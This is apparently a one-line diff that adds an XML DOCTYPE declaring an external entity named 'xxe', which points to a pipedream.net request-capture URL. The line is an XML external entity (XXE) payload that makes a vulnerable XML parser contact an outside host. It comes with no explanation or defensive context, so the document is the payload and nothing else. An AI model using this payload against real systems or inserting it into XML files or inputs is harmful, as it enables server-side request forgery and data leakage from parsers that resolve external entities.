@@ -1,0 +1,1 @@
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://enn4i9s3lxdy7iw.m.pipedream.net"> ]>
